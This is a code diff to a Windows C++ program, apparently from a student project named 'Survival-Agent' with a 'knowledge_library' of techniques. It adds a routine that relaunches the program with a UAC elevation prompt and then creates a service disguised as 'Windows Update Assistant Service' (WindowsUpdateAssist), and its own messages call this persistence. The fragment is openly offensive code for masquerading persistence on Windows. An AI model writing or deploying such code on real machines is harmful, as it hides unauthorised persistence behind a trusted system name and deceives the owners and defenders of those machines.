@@ -14,10 +14,26 @@ bool IsRunAsAdmin() {
     }
     return fIsRunAsAdmin;
 }
+void RelaunchAsAdmin() {
+    char szPath[MAX_PATH];
+    if (GetModuleFileNameA(NULL, szPath, ARRAYSIZE(szPath))) {
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";           // The "Secret Sauce" for UAC prompt
+        sei.lpFile = szPath;
+        sei.hwnd = NULL;
+        sei.nShow = SW_NORMAL;
+
+        if (!ShellExecuteExA(&sei)) {
+            std::cerr << "[-] User refused elevation. Persistence will fail." << std::endl;
+        }
+        exit(0); // Close the non-admin process
+    }
+}
 
 int main() {
     if (!IsRunAsAdmin()) {
         std::cerr << "[FAILURE] This technique requires Elevation." << std::endl;
+        RelaunchAsAdmin();
         return 1;
     }
     
@@ -29,7 +45,7 @@ int main() {
     
     LPCSTR serviceName = "WindowsUpdateAssist";
     LPCSTR displayName = "Windows Update Assistant Service";
-    LPCSTR binPath = "C:\\Users\\abdul\\Downloads\\FYP\\task1\\knowledge_library\\windows_service_creation.exe";
+    LPCSTR binPath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\knowledge_library\\windows_service_creation.exe";
     
     SC_HANDLE hService = CreateServiceA(
         hSCManager,
